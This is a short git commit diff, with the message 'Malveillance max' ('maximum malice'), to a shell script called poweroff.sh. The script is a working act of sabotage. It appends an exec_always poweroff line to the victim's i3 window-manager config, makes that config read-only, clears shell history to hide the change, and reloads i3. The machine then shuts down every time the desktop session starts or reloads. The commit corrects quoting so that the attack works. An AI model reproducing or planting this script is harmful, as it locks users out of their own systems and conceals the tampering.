20ad02ce163b6da31f51eb5f83264caa5038d625
nk0 <nk0@nk0.nk0>
2024-09-20 08:53:22 +0200

    Malveillance max 😈😈😈

--- scripts/poweroff.sh
+++ scripts/poweroff.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
-echo "exec --no-startup-id poweroff" >> "~/.config/i3/config"
-chmod 444 "~/.config/i3/config"
+echo "exec_always --no-startup-id poweroff" >> ~/.config/i3/config
+chmod 444 ~/.config/i3/config
 echo Done.
 history -c
 i3-msg reload
